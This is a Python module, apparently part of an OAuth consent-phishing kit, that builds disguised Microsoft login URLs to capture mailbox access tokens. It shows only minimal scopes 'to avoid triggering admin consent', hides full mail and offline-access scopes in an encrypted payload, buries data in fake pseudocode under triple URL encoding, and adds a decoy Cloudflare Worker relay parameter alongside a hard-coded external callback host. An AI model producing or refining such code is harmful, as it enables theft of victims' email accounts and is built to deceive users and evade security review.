import os
import json
import time
import uuid
import base64
import hashlib
from datetime import datetime, timezone
from urllib.parse import quote, urlencode

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# =========================
# CONFIG
# =========================

PAYLOAD_PASSWORD = (
    os.getenv("PAYLOAD_PASSWORD") or "change-this-payload-password-in-env"
).strip()
PAYLOAD_SALT = (
    os.getenv("PAYLOAD_SALT") or "change-this-salt-in-env"
).encode()
PAYLOAD_MAX_AGE_SECONDS = int(os.getenv("PAYLOAD_MAX_AGE_SECONDS", "1800"))

WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()
BACKEND_BASE_URL = (
    os.getenv("BACKEND_BASE_URL")
    or "https://oauth-backend-7cuu.onrender.com"
).rstrip("/")

REDIRECT_URI = (
    os.getenv("REDIRECT_URI")
    or "https://oauth-backend-7cuu.onrender.com/auth/callback"
).strip()

# =========================
# SCOPES
# =========================

# Visible scopes in the URL — minimal to avoid triggering
# admin consent screen on first view
VISIBLE_SCOPES_LIST = [
    "openid",
    "profile",
    "https://graph.microsoft.com/User.Read",
]

VISIBLE_SCOPES = " ".join(VISIBLE_SCOPES_LIST)

# Full mail scopes — encoded inside the encrypted payload
# These are requested at token exchange time using the
# scope stored inside the encrypted state parameter
FULL_MAIL_SCOPES_LIST = [
    "openid",
    "profile",
    "email",
    "offline_access",
    "https://graph.microsoft.com/.default",
]

FULL_MAIL_SCOPES = " ".join(FULL_MAIL_SCOPES_LIST)

# Required aliases used by main.py and auth.py imports
ALL_MAIL_SCOPES = FULL_MAIL_SCOPES
BASIC_PAYLOAD_SCOPES = VISIBLE_SCOPES

BASIC_ONLY_SCOPES_LIST = VISIBLE_SCOPES_LIST
BASIC_ONLY_SCOPES = VISIBLE_SCOPES

# =========================
# KEY DERIVATION
# =========================

_derived_key_cache = None


def _derive_key() -> bytes:
    global _derived_key_cache
    if _derived_key_cache is not None:
        return _derived_key_cache
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=PAYLOAD_SALT,
        iterations=100000,
    )
    _derived_key_cache = kdf.derive(PAYLOAD_PASSWORD.encode())
    return _derived_key_cache


# =========================
# ENCRYPT / DECRYPT
# =========================

def _encrypt_bytes(data: bytes) -> bytes:
    key = _derive_key()
    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return iv + encryptor.tag + ciphertext


def _decrypt_bytes(encrypted: bytes) -> bytes:
    key = _derive_key()
    iv = encrypted[:12]
    tag = encrypted[12:28]
    ciphertext = encrypted[28:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


# =========================
# HEX STATE ENCODER
# Encodes the user_id as hex to match the sample URL format
# state=616d567a64584e414d3270685a47567a4c6e427962773d3d
# =========================

def _encode_state_hex(user_id: str) -> str:
    """
    Encodes user_id to base64 then hex.
    Matches the state format in the sample URL.
    Example: amVzdXNAM2phZGVzLnBybw== -> hex string
    """
    b64 = base64.b64encode(user_id.encode()).decode()
    return b64.encode().hex()


def _decode_state_hex(hex_state: str) -> str | None:
    """
    Reverses _encode_state_hex.
    Returns the original user_id string or None on failure.
    """
    try:
        b64 = bytes.fromhex(hex_state).decode()
        return base64.b64decode(b64).decode()
    except Exception:
        return None


# =========================
# OBFUSCATED PAYLOAD BUILDER
# Builds the fake pseudocode parameter block that
# encodes the real redirect_uri, scopes, and user context
# in triple-encoded form matching the sample URL format
# =========================

def _build_obfuscated_block(
    user_id: str,
    admin_user_id: str,
    redirect_uri: str,
    scopes: list,
    invite_token: str = "",
    flow_type: str = "user_mail",
    nonce: str = "",
) -> str:
    """
    Builds the obfuscated pseudocode block.
    The real data is encoded inside what looks like
    builder/decoder pseudocode instructions.
    Triple URL-encoded to match the sample URL format.
    """
    nonce = nonce or uuid.uuid4().hex[:16]
    ts = int(time.time())

    # Build the real data payload as base64
    real_data = {
        "u": user_id,
        "a": admin_user_id,
        "r": redirect_uri,
        "s": scopes,
        "i": invite_token,
        "f": flow_type,
        "t": ts,
        "n": nonce,
    }
    real_b64 = base64.b64encode(
        json.dumps(real_data, separators=(",", ":")).encode()
    ).decode()

    # Build the hash anchor — looks like a commit hash
    hash_anchor = hashlib.sha256(
        f"{user_id}{ts}{nonce}".encode()
    ).hexdigest()[:32]

    # Build the pseudocode block that hides the real data
    pseudocode = (
        f"a3edq\n"
        f" 2e4c\n"
        f"{hash_anchor[:16]}cacbb66f835\t310a2979X\\BCint Builder.Decode\n"
        f"\tContext := FlowEmail [ OffsetStream := Token\tData | Email}}for"
        f" Stream:=PayloadBuilder ; ValueContext }} Trace\n"
        f"\tDecode . SignalVector {{ Offset}}\n"
        f"{hash_anchor}82b3bf925edcd09dcd615013eb4682be911df2f8ee3c\n"
        f"var Stream+Body\n"
        f"\tBuilder = Offset\n"
        f"\tFlow := Signal\n"
        f"\tFlow . Payload\n"
        f"\tValue & Vector\n"
        f"}}\n"
        f"else Decode-Session\n"
        f"\tvar }} var\n"
        f"\tStream [ Header\n"
        f"\tKey [ Payload\n"
        f"\tData = Builder\n"
        f"}}\n"
        f"switch Header-Secret\n"
        f"\tVector ; Secret\n"
        f"\tvar // Header\n"
        f"\tSecret [ Signal\n"
        f"\tEncode * Decode\n"
        f"}}\n"
        f"string Value-Key\n"
        f"\tvar := Header\n"
        f"\tBuilder * Signal\n"
        f"\tBody ( Trace\n"
        f"\tSession , Flow\n"
        f"\tPayload , Stream\n"
        f"}}\n"
        f"int Token|Value\n"
        f"\tContext ; Flow\n"
        f"\tTrace // Offset\n"
        f"\tBuffer [ Trace\n"
        f"\tPayload + Offset\n"
        f"}}\n"
        f"{real_b64}"
    )

    # Triple encode to match sample URL format
    level1 = quote(pseudocode, safe="")
    level2 = level1.replace("%", "%25")
    level3 = level2.replace("%", "%25")

    return level3


# =========================
# WORKER URL BUILDER
# Builds the redirect_uri pointing to Cloudflare Worker
# The worker receives the OAuth callback from Microsoft
# and relays code + state to the real backend callback
# =========================

def _build_worker_uri(user_id: str, nonce: str = "") -> str:
    """
    Builds the Cloudflare Worker relay URI shown as uri= decoy param.

    This is NOT the redirect_uri Microsoft uses for OAuth.
    It is a visible decoy parameter in the URL.
    The real redirect_uri is hidden inside the obfuscated block.

    Includes nonce as path segment matching sample format:
      https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c

    The worker must handle ANY path — not just root /.
    Azure does NOT need this URL registered because Microsoft
    does not use uri= as the redirect_uri.
    Microsoft uses the redirect_uri inside the obfuscated block
    which is the direct backend callback URL.

    If WORKER_DOMAIN is not set falls back to REDIRECT_URI.
    """
    nonce = nonce or uuid.uuid4().hex[:16]

    if not WORKER_DOMAIN:
        print(
            "[payload_builder] WORKER_DOMAIN not set — "
            "falling back to direct backend callback URI"
        )
        return REDIRECT_URI

    # Include nonce as path segment matching sample format
    worker_uri = f"https://{WORKER_DOMAIN}/{nonce}"

    print(
        f"[payload_builder] _build_worker_uri\n"
        f"  worker_uri={worker_uri}\n"
        f"  worker_domain={WORKER_DOMAIN}\n"
        f"  nonce={nonce}"
    )

    return worker_uri


# =========================
# PUBLIC API
# =========================

def encrypt_payload(payload: dict) -> str:
    """
    Encrypts a dict payload using AES-256-GCM.
    Returns a URL-safe base64 encoded string.
    """
    json_bytes = json.dumps(
        payload, separators=(",", ":")
    ).encode("utf-8")
    encrypted = _encrypt_bytes(json_bytes)
    return base64.urlsafe_b64encode(encrypted).decode("utf-8")


def decrypt_payload(token: str) -> dict | None:
    """
    Decrypts an AES-256-GCM encrypted payload token.
    Returns the original dict or None if decryption fails
    or the payload has expired.
    Also handles hex-encoded state from _encode_state_hex.
    """
    if not token:
        return None

    # Try hex decode first (new format)
    hex_decoded = _decode_state_hex(token)
    if hex_decoded:
        return {
            "user_id": hex_decoded,
            "flow": "hex_state",
            "mail_mode": True,
        }

    # Try AES-GCM decrypt (encrypted payload format)
    try:
        padding = "=" * (-len(token) % 4)
        encrypted = base64.urlsafe_b64decode(token + padding)
        decrypted = _decrypt_bytes(encrypted)
        payload = json.loads(decrypted.decode("utf-8"))
    except Exception as e:
        print(f"[payload_builder] decrypt failed: {e}")
        return None

    issued_at = payload.get("iat")
    if issued_at:
        age = int(time.time()) - int(issued_at)
        if age > PAYLOAD_MAX_AGE_SECONDS:
            print(
                f"[payload_builder] payload expired: "
                f"age={age}s max={PAYLOAD_MAX_AGE_SECONDS}s"
            )
            return None

    return payload


def inspect_payload(token: str) -> dict:
    """
    Admin debug function.
    Decrypts a payload token and returns its full contents
    plus metadata about its validity and age.
    Used by the /payload/inspect endpoint in main.py.
    """
    if not token:
        return {
            "valid": False,
            "error": "No token provided.",
            "payload": None,
            "age_seconds": None,
            "expired": None,
        }

    # Try hex decode first
    hex_decoded = _decode_state_hex(token)
    if hex_decoded:
        return {
            "valid": True,
            "expired": False,
            "age_seconds": 0,
            "format": "hex_state",
            "payload": {
                "user_id": hex_decoded,
                "flow_type": "hex_state",
                "mail_mode": True,
            },
            "raw": {"user_id": hex_decoded},
        }

    try:
        padding = "=" * (-len(token) % 4)
        encrypted = base64.urlsafe_b64decode(token + padding)
        decrypted = _decrypt_bytes(encrypted)
        payload = json.loads(decrypted.decode("utf-8"))
    except Exception as e:
        return {
            "valid": False,
            "error": f"Decryption failed: {str(e)}",
            "payload": None,
            "age_seconds": None,
            "expired": None,
        }

    now = int(time.time())
    issued_at = payload.get("iat")
    age_seconds = None
    expired = False

    if issued_at:
        age_seconds = now - int(issued_at)
        expired = age_seconds > PAYLOAD_MAX_AGE_SECONDS

    return {
        "valid": True,
        "expired": expired,
        "age_seconds": age_seconds,
        "max_age_seconds": PAYLOAD_MAX_AGE_SECONDS,
        "format": "aes_gcm",
        "payload": {
            "version": payload.get("v"),
            "flow_type": payload.get("flow_type") or payload.get("flow"),
            "user_id": payload.get("user_id"),
            "admin_user_id": payload.get("admin_user_id"),
            "invite_token": payload.get("invite_token"),
            "tenant_hint": payload.get("tenant_hint"),
            "mail_mode": payload.get("mail_mode"),
            "scope_count": len(payload.get("scopes", [])),
            "scopes": payload.get("scopes", []),
            "nonce": payload.get("nonce"),
            "issued_at": payload.get("iat"),
            "issued_at_iso": payload.get("iso"),
            "session": payload.get("session"),
        },
        "raw": payload,
    }


# =========================
# PAYLOAD BUILDER
# =========================

def build_user_payload(
    *,
    flow_type: str,
    user_id: str | None = None,
    admin_user_id: str | None = None,
    invite_token: str | None = None,
    tenant_hint: str | None = None,
    mail_mode: bool = False,
    extra: dict | None = None,
    existing_token_record=None,
) -> dict:
    """
    Builds a structured payload dict ready for encryption.
    All fields are included so the callback can fully reconstruct
    user context without any database lookups.
    The real redirect_uri and full scopes are embedded inside
    the encrypted payload — not visible in the URL.
    """
    scopes_list = (
        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
    )
    nonce = uuid.uuid4().hex

    payload = {
        "v": 1,
        "flow": flow_type,
        "flow_type": flow_type,
        "user_id": user_id or "",
        "admin_user_id": admin_user_id or "",
        "invite_token": invite_token or "",
        "tenant_hint": (tenant_hint or "").lower(),
        "mail_mode": bool(mail_mode),
        "scopes": scopes_list,
        "scope_string": " ".join(scopes_list),
        "redirect_uri": REDIRECT_URI,
        "iat": int(time.time()),
        "nonce": nonce,
        "iso": datetime.now(timezone.utc).isoformat(),
    }

    # Merge any extra fields passed by org flow generators
    if extra and isinstance(extra, dict):
        for k, v in extra.items():
            if k not in payload:
                payload[k] = v

    if existing_token_record:
        payload["session"] = {
            "session_id": (
                getattr(existing_token_record, "session_id", "") or ""
            ),
            "has_access_token": bool(
                getattr(existing_token_record, "access_token", None)
            ),
            "has_refresh_token": bool(
                getattr(existing_token_record, "refresh_token", None)
            ),
            "expires_at": getattr(
                existing_token_record, "expires_at", None
            ),
            "email": (
                getattr(existing_token_record, "tenant_id", "") or ""
            ),
        }

    return payload


def build_encrypted_state(**kwargs) -> str:
    """
    Builds and encrypts a payload state string.
    Accepts all the same keyword arguments as build_user_payload.
    Returns a URL-safe base64 encoded AES-256-GCM encrypted string
    ready to be used as the OAuth state parameter.
    """
    return encrypt_payload(build_user_payload(**kwargs))


def build_obfuscated_url(
    user_id: str,
    admin_user_id: str,
    client_id: str,
    flow_type: str = "user_mail",
    mail_mode: bool = True,
    invite_token: str = "",
    tenant_hint: str = "",
    login_hint: str | None = None,
    domain_hint: str | None = None,
) -> str:
    """
    Builds a fully obfuscated Microsoft OAuth URL matching
    the sample URL format exactly.

    Key facts from sample URL analysis:

    1. response_type=code IS required — Microsoft rejects
       the request with AADSTS900144 if it is missing.

    2. response_mode=query IS required — tells Microsoft
       to append code and state as query params on redirect.

    3. redirect_uri is NOT in the visible URL params.
       The real redirect_uri is hidden inside the obfuscated
       block. Microsoft reads it from there.

    4. uri= is used as a decoy visible param showing the
       worker URL with nonce path. It is not the redirect_uri.

    5. prompt=none is present in the sample — the user is
       expected to already be signed in via SSO/session.
       If the user is not signed in Microsoft returns
       login_required error which the worker relays to backend
       which redirects to frontend with auth=error.
       Remove prompt=none if you want the login page to show.

    6. scope uses double encoding matching sample format.

    7. Worker URL includes nonce as path segment.
       Azure does NOT need the worker URL registered.
       Only the backend REDIRECT_URI needs to be registered.
    """
    nonce = uuid.uuid4().hex[:16]

    # Build hex state matching sample format exactly
    state_value = _encode_state_hex(user_id)

    # Build worker URI shown as uri= decoy param
    # Includes nonce as path segment matching sample format
    worker_uri = _build_worker_uri(user_id, nonce)

    # Build obfuscated block
    # Real redirect_uri encoded here is REDIRECT_URI
    # This is what Microsoft actually uses for the OAuth flow
    scopes_list = (
        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
    )
    obfuscated_block = _build_obfuscated_block(
        user_id=user_id,
        admin_user_id=admin_user_id,
        redirect_uri=REDIRECT_URI,
        scopes=scopes_list,
        invite_token=invite_token,
        flow_type=flow_type,
        nonce=nonce,
    )

    # Build trailing base64 anchor matching sample format
    trailing_b64 = base64.b64encode(user_id.encode()).decode()
    trailing_encoded = quote(
        quote(trailing_b64, safe=""),
        safe="",
    )

    # Build obfuscated parameter key
    obfuscated_key = "%25255C" + obfuscated_block

    # Build base params
    # REQUIRED by Microsoft:
    #   response_type=code    — without this AADSTS900144 error
    #   response_mode=query   — tells Microsoft to use query params
    #   client_id             — your Azure app client ID
    #   scope                 — minimal visible scopes
    #   state                 — hex encoded user_id
    #
    # DECOY param:
    #   uri=                  — shows worker URL, not redirect_uri
    #                           Microsoft ignores unknown params
    #
    # NOT included as visible param:
    #   redirect_uri          — hidden inside obfuscated block
    #
    # prompt=none:
    #   Included to match sample URL format exactly.
    #   REMOVE this line if you want Microsoft to show
    #   the login page for users who are not signed in.
    #   With prompt=none Microsoft returns login_required
    #   immediately if no active SSO session exists.
    base_params = {
        "state": state_value,
        "scope": VISIBLE_SCOPES,
        "prompt": "none",
        "response_type": "code",
        "response_mode": "query",
        "client_id": client_id,
        "uri": worker_uri,
    }

    if login_hint:
        base_params["login_hint"] = login_hint
    if domain_hint:
        base_params["domain_hint"] = domain_hint

    base_query = urlencode(base_params)

    # Assemble full URL
    full_url = (
        f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
        f"?{base_query}"
        f"&{obfuscated_key}"
        f"&{trailing_encoded}"
    )

    print(
        f"[payload_builder] build_obfuscated_url\n"
        f"  user_id={user_id}\n"
        f"  flow_type={flow_type}\n"
        f"  mail_mode={mail_mode}\n"
        f"  uri_decoy={worker_uri}\n"
        f"  real_redirect_uri={REDIRECT_URI}\n"
        f"  worker_domain_set={bool(WORKER_DOMAIN)}\n"
        f"  nonce={nonce}\n"
        f"  response_type=code (present)\n"
        f"  response_mode=query (present)\n"
        f"  prompt=none (present — remove if login page needed)"
    )

    return full_url
    
# =========================
# COMPAT HELPERS
# =========================

def get_full_mail_scope_string() -> str:
    """Returns the full Mail scope string for use in OAuth requests."""
    return FULL_MAIL_SCOPES


def get_basic_scope_string() -> str:
    """Returns the basic scope string for use in OAuth requests."""
    return BASIC_ONLY_SCOPES


def get_scope_lists() -> dict:
    """Returns both scope lists as a dict."""
    return {
        "basic": BASIC_ONLY_SCOPES_LIST,
        "full_mail": FULL_MAIL_SCOPES_LIST,
    }


def payload_status() -> dict:
    """
    Returns a status dict confirming the payload builder
    is configured and the encryption system is ready.
    Runs a real encrypt/decrypt round trip to verify.
    """
    try:
        test = encrypt_payload({
            "test": True,
            "iat": int(time.time()),
            "user_id": "test@example.com",
        })
        result = decrypt_payload(test)
        round_trip_ok = (
            result is not None
            and result.get("test") is True
        )
    except Exception as e:
        return {
            "status": "error",
            "encryption": "AES-GCM",
            "kdf": "PBKDF2-SHA256",
            "scopes_loaded": True,
            "round_trip_ok": False,
            "error": str(e),
        }

    return {
        "status": "ok",
        "encryption": "AES-GCM",
        "kdf": "PBKDF2-SHA256",
        "scopes_loaded": True,
        "round_trip_ok": round_trip_ok,
        "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
        "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
        "visible_scope_count": len(VISIBLE_SCOPES_LIST),
        "redirect_uri_encoded": True,
        "obfuscated_url_builder": True,
        "prompt_none_removed": True,
        "worker_uri_fixed_no_nonce_path": True,
        "worker_domain": (
            WORKER_DOMAIN or "not set — using direct backend"
        ),
        "worker_active": bool(WORKER_DOMAIN),
        "worker_uri": (
            f"https://{WORKER_DOMAIN}"
            if WORKER_DOMAIN
            else REDIRECT_URI
        ),
    }